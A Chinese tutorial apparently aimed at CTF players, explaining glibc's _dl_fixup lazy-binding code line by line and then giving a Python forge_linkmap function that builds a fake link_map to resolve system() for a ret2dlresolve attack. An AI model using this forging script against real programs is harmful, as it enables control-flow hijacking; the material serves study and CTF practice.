# \[Ret2dlresolve\]  迈出阅读Glibc源码的第一步

---

最后更新于 2025-11-22 by XDLiu

!!! note "前提"
	本文相较于其他的`Ret2dlresolve`文章更侧重于针对延迟绑定技术的**Glibc源码的解读**，对于其他相关的具体信息以及多种利用手法，建议先粗略阅读这篇文章[Ret2dlresolve攻击——从No RELRO到FULL RELRO](https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/){target="_blank" rel="noopener"} 回头再来阅读下面的源码解析，希望读者能有拨开云雾见青天之感。

### 再次明确延迟绑定技术函数调用流程

> 以x64下的setvbuf函数为例

`setvbuf@plt`->`plt[0]`->`_dl_runtime_resolve_xsavec`->`_dl_fixup`->`setvbuf`
当第一次运行setvbuf函数时会触发上面的过程，最终将setvbuf在libc中的地址写入到setvbuf@got表中。我们主要关注的是_dl_fixup函数，也是利用手法的主要目标

### 阅读`_dl_fixup`源码
!!! tip "小技巧"
    为了能够加深印象，以及方便解决阅读过程不解的地方，可以选择Glibc源码调试
    apt下载安装`libc6-dbg`和`glibc-source`
    `glibc-source`下载好后`/usr/src/glibc`目录下会多出一个压缩包，将其解压后，记住解压目录，gdb调试程序时输入`directory /usr/src/glibc/glibc-2.xx`告诉调试器源码的位置，接下来调试到`_dl_fixup`即可

```c title="_dl_fixup" linenums="1"
DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
	   struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL])
		      + reloc_offset (pltgot, reloc_arg));
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
	{
	  THREAD_GSCOPE_SET_FLAG ();
	  flags |= DL_LOOKUP_GSCOPE_LOCK;
	}

      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      if (!RTLD_SINGLE_THREAD_P)
	THREAD_GSCOPE_RESET_FLAG ();

      value = DL_FIXUP_MAKE_VALUE (result,
				   SYMBOL_ADDRESS (result, sym, false));
    }
  else
    {
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  if (l->l_reloc_result != NULL)
    {
      struct reloc_result *reloc_result
	= &l->l_reloc_result[reloc_index (pltgot, reloc_arg, sizeof (PLTREL))];
      unsigned int init = atomic_load_acquire (&reloc_result->init);
      if (init == 0)
	{
	  _dl_audit_symbind (l, reloc_result, reloc, sym, &value, result, true);

	  if (__glibc_likely (! GLRO(dl_bind_not)))
	    {
	      reloc_result->addr = value;
	      atomic_store_release (&reloc_result->init, 1);
	    }
	}
      else
	value = reloc_result->addr;
    }
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```
>建议多开个界面看上边源码或者用这个网站[_dl_fixup](https://elixir.bootlin.com/glibc/glibc-2.41/source/elf/dl-runtime.c#L41){target="_blank" rel="noopener"}

#### 开头-参数传入&变量定义
``` c
_dl_fixup (
	   struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL])
		      + reloc_offset (pltgot, reloc_arg));
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
```
 首先关注传入的第一个变量`link_map`结构体指针，还有个`ElfW(Word)`类型的`reloc_arg`

`Elf(word)`定义展开来就是

```c
#define ElfW(type)	_ElfW (Elf, __ELF_NATIVE_CLASS, type)
#define _ElfW(e,w,t)	_ElfW_1 (e, w, _##t)
#define _ElfW_1(e,w,t)	e##w##t
```

当你是64位系统时`__ELF_NATIVE_CLASS`则是`64`，同时`##`是符号连接将两个符号连在一起，`A##B`->`AB`

`ElfW(Word) `-> `_ElfW (Elf, 64, Word)` -> `_ElfW_1 (Elf, 64, _Word)` -> `Elf64_Word`

因此`ElfW(Word)`展开就是`Elf64_Word`，看名字就能知道多半就是32位的int或者uint类型，查阅源码得到就是`typedef uint32_t Elf64_Word;`

传入的这两变量都是在`setvbuf@plt`阶段push到栈上面的，`reloc_arg`主要就是用于定位目标函数相关信息在`.rel.plt`表所在的位置

接下来则是进行了多个变量赋值可以看到多个`D_PTR (l, l_info[DT_xxxxxx])`

`D_PTR (l, l_info[DT_xxxxxx])`定义展开来就是

```c
#define D_PTR(map, i) \
  ((map)->i->d_un.d_ptr + (dl_relocate_ld (map) ? 0 : (map)->l_addr))

static inline bool
dl_relocate_ld (const struct link_map *l)
{
  /* Don't relocate dynamic section if it is readonly  */
  return !(l->l_ld_readonly || DL_RO_DYN_SECTION);
}
```

展开后`((l)->l_info[DT_xxxxxx]->d_un.d_ptr + (dl_relocate_ld (l) ? 0 : (l)->l_addr))`解释这个展开后的内容则就要涉及到`.dynamic`节里存放的`Elf64_Dyn`结构体，里面则储存着其他节的比如`。rel.plt`、`.dynsym`、`.dynstr`等节的地址，方便后续解析过程获取动态地址

```c
typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;
```

其中`d_tag`有如下定义

```c
/* Legal values for d_tag (dynamic entry type).  */
#define DT_NULL                0                /* Marks end of dynamic section */
#define DT_NEEDED              1                /* Name of needed library */
#define DT_PLTRELSZ            2                /* Size in bytes of PLT relocs */
#define DT_PLTGOT              3                /* Processor defined value */
#define DT_HASH                4                /* Address of symbol hash table */
#define DT_STRTAB              5                /* Address of string table */
#define DT_SYMTAB              6                /* Address of symbol table */
#define DT_RELA                7                /* Address of Rela relocs */
#define DT_RELASZ              8                /* Total size of Rela relocs */
#define DT_RELAENT             9                /* Size of one Rela reloc */
#define DT_STRSZ              10                /* Size of string table */
#define DT_SYMENT             11                /* Size of one symbol table entry */
#define DT_INIT               12                /* Address of init function */
#define DT_FINI               13                /* Address of termination function */
#define DT_SONAME             14                /* Name of shared object */
#define DT_RPATH              15                /* Library search path (deprecated) */
#define DT_SYMBOLIC           16                /* Start symbol search here */
#define DT_REL                17                /* Address of Rel relocs */
#define DT_RELSZ              18                /* Total size of Rel relocs */
#define DT_RELENT             19                /* Size of one Rel reloc */
#define DT_PLTREL             20                /* Type of reloc in PLT */
#define DT_DEBUG              21                /* For debugging; unspecified */
#define DT_TEXTREL            22                /* Reloc might modify .text */
#define DT_JMPREL             23                /* Address of PLT relocs */
#define DT_BIND_NOW           24                /* Process relocations of object */
#define DT_INIT_ARRAY         25                /* Array with addresses of init fct */
#define DT_FINI_ARRAY         26                /* Array with addresses of fini fct */
#define DT_INIT_ARRAYSZ       27                /* Size in bytes of DT_INIT_ARRAY */
#define DT_FINI_ARRAYSZ       28                /* Size in bytes of DT_FINI_ARRAY */
#define DT_RUNPATH            29                /* Library search path */
#define DT_FLAGS              30                /* Flags for the object being loaded */
#define DT_ENCODING           32                /* Start of encoded range */
#define DT_PREINIT_ARRAY      32                /* Array with addresses of preinit fct*/
#define DT_PREINIT_ARRAYSZ    33                /* size in bytes of DT_PREINIT_ARRAY */
#define DT_SYMTAB_SHNDX       34                /* Address of SYMTAB_SHNDX section */
#define DT_NUM                35                /* Number used */
```

`link_map`结构体成员`l_info`里储存的是各个`Elf64_Dyn`结构体指针`l_info[DT_xxxxxx]`则是获取对应结构体进一步`->d_un.d_ptr`则是获取对应节的地址。

后续遇到`(dl_relocate_ld (map) ? 0 : (map)->l_addr)`判断，开启了`RELRO`后返回的是`False`所以会加上后续的`(map)->l_addr`这个`l_addr`可以理解为程序或者库在虚拟空间的基地址，也就是做题通过泄漏所得的基地址，一般没开启PIE为0，主要就是判断了`.dynamic`节是否可写，不可写的话，得程序手动加上基地址，如果程序是`NO RELRO`说明`.dynamic`可写，`ld.so`会提前将`Elf64_Dyn`结构体的`d_ptr`地址重定位，因此不必再次加上基地址。

```c
const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
```

获取`.dyn.sym`节的起始地址

```c
const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
```

获取`.dyn.str`节的起始地址

```c
const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);
```

获取`got`表的起始地址

```c
 const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL])
		      + reloc_offset (pltgot, reloc_arg));
reloc_offset (uintptr_t plt0, uintptr_t pltn)
{
  return pltn * sizeof (ElfW(Rela));
}
Elfw(Rela) -> Elf64_Rela
typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;
```

获取了解析目标函数相关信息在`.rel.plt`节的地址

```c
const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
const ElfW(Sym) *refsym = sym;

ElfW(Sym) -> Elf64_Sym
typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;

#define ELFW(type)	_ElfW (ELF, __ELF_NATIVE_CLASS, type)
ELFW(R_SYM) -> ELF64_R_SYM
#define ELF64_R_SYM(i)			((i) >> 32)
ELFW(R_SYM) (reloc->r_info) -> ((reloc->r_info) >> 32)
```

可以认为`Elf64_Rela.r_info`的高32位内容是解析目标函数相关信息在`.dyn.sym`节的偏移

```c
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

typedef struct link_map *lookup_t;
#define DL_FIXUP_VALUE_TYPE ElfW(Addr)
```

获取到解析目标函数在`got`表的位置

```c
assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
ELFW(R_TYPE) -> ELF64_R_TYPE
#define ELF64_R_TYPE(i)			((i) & 0xffffffff)
#define ELF_MACHINE_JMP_SLOT	R_X86_64_JUMP_SLOT
#define R_X86_64_JUMP_SLOT	7	
```

这里主要就是获取了`Elf64_Rela.r_info`低32位内容，由于`assert`为真才能通过，所以伪造时得注意绕过这个。

#### 中部-执行符号查找

```c
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
	{
	  THREAD_GSCOPE_SET_FLAG ();
	  flags |= DL_LOOKUP_GSCOPE_LOCK;
	}

      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      if (!RTLD_SINGLE_THREAD_P)
	THREAD_GSCOPE_RESET_FLAG ();

      value = DL_FIXUP_MAKE_VALUE (result,
				   SYMBOL_ADDRESS (result, sym, false));
    }
  else
    {
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }
```

```c
if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
#define ELF64_ST_VISIBILITY(o)	ELF32_ST_VISIBILITY (o)
#define ELF32_ST_VISIBILITY(o)	((o) & 0x03)
```

首先不难注意到`__builtin_expect(xxx,yyy)`这是个底层优化函数，比如`yyy`为0，那么就是告诉编译器`xxx`的结果大概率为0，这边则是0 ==0 为真，那么if为真的路线就是平坦路线，不会出现跳转详细的可以Google或者AI

这边主要是判断符号的可见性，判断是否需要从外部查找符号为0则是默认全局可见，因此`Elf64_Sym.st_other`低2位为0则进入真条件

```c
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}
```

这里是尝试获取解析目标函数处理版本符号的信息，获取目标节，通过`Elf64_Rela.r_info`的高32位，获取到`ndx`，最后尝试获取版本信息，因为`version`可以为空，这一块不重要可以忽略，

````c
result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

strtab + sym->st_name: 要查找的符号的名字在.dynstr节所在地址
l: 发起查找请求的库的 link_map。
&sym: 一个指针的指针。查找函数会用找到的、定义该符号的库中的 sym 结构体来更新它。
l->l_scope: 查找范围。这是一个列表，包含了l所依赖的所有库。查找将按顺序在这个列表中进行。
version: 我们在上一步中找到的符号版本要求。
flags: 我们构建的查找标志，包括是否需要加锁等。
````

这一块是执行符号查找，可以发现返回的是一个`link_map`结构体指针,该指针则是定义目标符号的那个库(比如`libc.so.6`库)对应的`link_map`，同时因为`sym`传入了指针则被更新为目标符号所在的那个库的`Elf64_Sym`结构体，重要的是其`Elf64_Sym.st_value`是目标符号在其所在库的偏移。

```c
      value = DL_FIXUP_MAKE_VALUE (result,
				   SYMBOL_ADDRESS (result, sym, false));
#define DL_FIXUP_MAKE_VALUE(map, addr) (addr)
#define SYMBOL_ADDRESS(map, ref, map_set)				\
  ((ref) == NULL ? 0							\
   : (__glibc_unlikely ((ref)->st_shndx == SHN_ABS) ? 0			\
      : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)->st_value)
# define __glibc_unlikely(cond)	__builtin_expect ((cond), 0)
#define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)->l_addr : 0)
#define SHN_ABS		0xfff1		/* Associated symbol is absolute */
```

首先能看到有个~~迷惑操作~~，就是宏`DL_FIXUP_MAKE_VALUE`给两参数，什么都没处理直接变成了只有参数2，主要原因是得考虑其他架构的问题，**为了抽象和跨平台可移植性**，所以前面为何有一堆宏定义的其中一个原因就是这个。上面整个操作下来就是`value = result->l_addr + sym->st_value`本质就是喜闻乐见的基地址+偏移地址获取目标函数。

```c
  else
    {
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }
```

这边就是另外一条路径就是符号不是全局可见的，直接就跳到了`value = result->l_addr + sym->st_value`这一步，用的就是程序自己的`link_map`和`sym`。

#### 结尾-写入Got表并执行

```c
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  if (l->l_reloc_result != NULL)
    {
      struct reloc_result *reloc_result
	= &l->l_reloc_result[reloc_index (pltgot, reloc_arg, sizeof (PLTREL))];
      unsigned int init = atomic_load_acquire (&reloc_result->init);
      if (init == 0)
	{
	  _dl_audit_symbind (l, reloc_result, reloc, sym, &value, result, true);

	  if (__glibc_likely (! GLRO(dl_bind_not)))
	    {
	      reloc_result->addr = value;
	      atomic_store_release (&reloc_result->init, 1);
	    }
	}
      else
	value = reloc_result->addr;
    }
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
```

```c
  value = elf_machine_plt_value (l, reloc, value);
  #define elf_machine_plt_value(map, reloc, value) (value)
```

~~经典迷惑操作，还是那个原因~~

```c
  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
#define ELF64_ST_TYPE(val)		ELF32_ST_TYPE (val)
#define ELF32_ST_TYPE(val)		((val) & 0xf)
#define STT_GNU_IFUNC	10		/* Symbol is indirect code object */
```

获取`Elf64_Sym.st_info`低4位，判断是否等于10，一般来说绕过即可

```c
  if (l->l_reloc_result != NULL)
    {
    ......
    }
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
```

`l->l_reloc_result `一般为0跳过即可，`GLRO(dl_bind_not)`关系的环境变量，如果设置了，则不会写入`got`表对应位置，导致后续每次执行函数都会进行慢速解析

```c
return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
static inline ElfW(Addr)
elf_machine_fixup_plt (struct link_map *map, lookup_t t,
		       const ElfW(Sym) *refsym, const ElfW(Sym) *sym,
		       const ElfW(Rela) *reloc,
		       ElfW(Addr) *reloc_addr, ElfW(Addr) value)
{
  return *reloc_addr = value;
}
```

写入`got`表，结束

----

### 要点总结

=== "Elf64_Rela"
    ```c
    typedef struct /* 大小8+8+8=24 */
    {
      Elf64_Addr	r_offset;		/* 目标符号got表相对基地址偏移 */
      Elf64_Xword	r_info;			/* 高32位为目标函数在symtab的偏移即symtab[r_info]，低32必须为7*/
      Elf64_Sxword	r_addend;		/*  */
    } Elf64_Rela;
    ```
=== "Elf64_Sym"
    ```c
    typedef struct /* 大小4+1+1+2+8+8 */
    {
      Elf64_Word	st_name;		/* 目标符号对应字符串相对.dyn.str节起始地址的地址偏移 */
      unsigned char	st_info;		/* 不为10即可 */
      unsigned char st_other;		/* 低两位为0则进入符号查找条件，不为0则直接获取符号地址，关系到不同利用手法 */
      Elf64_Section	st_shndx;		/* 不为0xfff1即可 */
      Elf64_Addr	st_value;		/* 64无输出地址手法中可以将这覆盖到got表上的内容 */
      Elf64_Xword	st_size;		/*  */
    } Elf64_Sym;
    ```
=== "link_map"
    ```c
    struct link_map /* l_addr到l_info之间间隔8+8+8+8+8+8+8+8=0x40 */
      {
        ElfW(Addr) l_addr;		
        char *l_name;		
        ElfW(Dyn) *l_ld;	
        struct link_map *l_next, *l_prev;
        struct link_map *l_real;
        Lmid_t l_ns;
        struct libname_list *l_libname;
        ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
              + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
        /* DT_STRTAB DT_SYMTAB DT_JMPREL分别是在5 6 23*/
    ```
=== "Elf64_Dyn"
    ```c
    typedef struct /* 大小8+8 */
    {
      Elf64_Sxword	d_tag;			/* DT_STRTAB DT_SYMTAB DT_JMPREL分别是在5 6 23 */
      union
        {
          Elf64_Xword d_val;		
          Elf64_Addr d_ptr;			
        } d_un;
    } Elf64_Dyn;
    ```

### 补充

针对先前建议阅读的那篇[文章](https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/)，对其64位无输出利用手法的构造脚本进行一些补充修改

1) 可能存在`call_libc_RVA - known_libc_RVA`是负数而不能`pack`情况，进行处理
2) 多添加了一个参数可将解析出来的函数地址写入该地址，如果默认为0，则将其替换为`known_elf_got_VA`

```c
def forge_linkmap(linkmap_addr, known_libc_RVA, call_libc_RVA, known_elf_got_VA, get_new_addr_write_to=0, arch='x64',custom_data=b""):

    assert isinstance(custom_data, bytes)

    DT_STRTAB = 5
    DT_SYMTAB = 6
    DT_JMPREL = 23
    if get_new_addr_write_to == 0 :
        get_new_addr_write_to = known_elf_got_VA
    l_addr = (call_libc_RVA - known_libc_RVA) & ((1<<64)-1)
    custom_data_addr = 0

    fake_rel_entry = b""   # fake entry
    writable_addr = 0      # got rewrite addr, must writable

    padding_byte = b"\x00"

    if arch=='x64':
        sizes = {
            "size_t":0x8,
            "l_addr":0x8,
            "l_info_offset":0x40,
            "Elf_Dyn":0x10,
            "Elf_Rel":0x18,
            "Elf_Sym":0x18,
        }
        pck = p64
        writable_addr = (get_new_addr_write_to - (call_libc_RVA - known_libc_RVA)) & ((1<<64)-1)
        fake_rel_entry = pck(writable_addr) + pck(7) + pck(0) # r_offset + r_info + r_addend : got_VA=writable_addr + <INDEX=0>|<TYPE=7> + whatever
    else:
        sizes = {
            "size_t":0x4,
            "l_addr":0x4,
            "l_info_offset":0x20,
            "Elf_Dyn":0x8,
            "Elf_Rel":0x8,
            "Elf_Sym":0x10,
        }
        pck = p32
        writable_addr = linkmap_addr + sizes['l_info_offset'] - sizes['size_t']
        fake_rel_entry = pck(writable_addr) + pck(7) # r_offset + r_info : got_VA=writable_addr + <INDEX=0>|<TYPE=7>


    l_info_offset = lambda idx : sizes["l_info_offset"] + idx*sizes["size_t"]

    # fill in l_info.
    # e.g. l_info[DT_STRTAB] = fake_dyn_strtab_entry_addr
    fake_dyn_strtab_entry_addr = linkmap_addr               + sizes['l_addr' ]
    fake_dyn_jmprel_entry_addr = fake_dyn_strtab_entry_addr + sizes['Elf_Dyn']
    fake_dyn_symtab_entry_addr = fake_dyn_jmprel_entry_addr + sizes['Elf_Dyn']

    fake_str_entry_addr = 0                                             # dlresolve: func str addr whatever
    fake_rel_entry_addr = linkmap_addr + sizes['l_info_offset']         # avoid program crash, must writable
    fake_sym_entry_addr = known_elf_got_VA - sizes['size_t']            # dlresolve: got entry and fake sym entry overlap

    fake_dyn_strtab_entry = pck(DT_STRTAB) + pck(fake_str_entry_addr) # Elf_Dyn: d_tag + d_ptr
    fake_dyn_symtab_entry = pck(DT_SYMTAB) + pck(fake_sym_entry_addr) # Elf_Dyn: d_tag + d_ptr
    fake_dyn_jmprel_entry = pck(DT_JMPREL) + pck(fake_rel_entry_addr) # Elf_Dyn: d_tag + d_ptr


    # Forge fake linkmap struct
    linkmap  = pck(l_addr)                       # diff between func A and func B: call_RVA - known_RVA
    # Three fake dyn entry
    linkmap += fake_dyn_strtab_entry             # point to fake_str_entry
    linkmap += fake_dyn_jmprel_entry             # point to fake_rel_entry
    linkmap += fake_dyn_symtab_entry             # point to fake_sym_entry which overlaps with got entry

    # Padding until l_info array start
    linkmap  = linkmap.ljust(sizes["l_info_offset"],padding_byte)

    # Insert fake str entry before l_info[DT_STRTAB]
    linkmap += fake_rel_entry                    # l_info[0]
    linkmap  = linkmap.ljust(l_info_offset(DT_STRTAB), padding_byte)

    # l_info list: each element is a pointer to a specific Elf_Dyn entry
    linkmap += pck(fake_dyn_strtab_entry_addr)   # l_info[DT_STRTAB], just readable addr actually 
    linkmap += pck(fake_dyn_symtab_entry_addr)   # l_info[DT_SYMTAB]

    # now we should padding and considering where the custom_data should be placed
    padding_size = l_info_offset(DT_JMPREL) - l_info_offset(DT_SYMTAB) - sizes['size_t']

    # if padding is big enough for custom_data, place it
    if(len(custom_data)<=padding_size):
        linkmap += custom_data
        custom_data_addr = linkmap_addr +  l_info_offset(DT_SYMTAB) + sizes['size_t']
        
    linkmap  = linkmap.ljust(l_info_offset(DT_JMPREL),padding_byte)
    linkmap += pck(fake_dyn_jmprel_entry_addr)   # l_info[DT_JMPREL]

    # otherwise, place custom_data on the bottom
    # it will enlarge fake link_map size
    if(len(custom_data)>padding_size):
        linkmap += custom_data
        custom_data_addr = linkmap_addr +  l_info_offset(DT_JMPREL) + sizes['size_t']

    return linkmap, custom_data_addr
```

使用

```python
"""
writable_addr    = 可控区域，其实就是link_map要写入的地址
known_libc_RVA   = 已解析的函数在ELF中的偏移，如elf.sym['sleep']
call_libc_RVA    = 想要解析的函数在ELF中的偏移，如elf.sym['system']
known_elf_got_VA = 已解析的函数对应的GOT表项在内存中的虚拟地址 
get_new_addr_write_to = 解析出的函数地址写入目标地址，默认为known_elf_got_VA
"""
dl, _ = forge_linkmap(buf+0x10, libc.sym["sleep"], libc.sym["system"], elf.got["sleep"], buf+0x100, arch='x64')
```

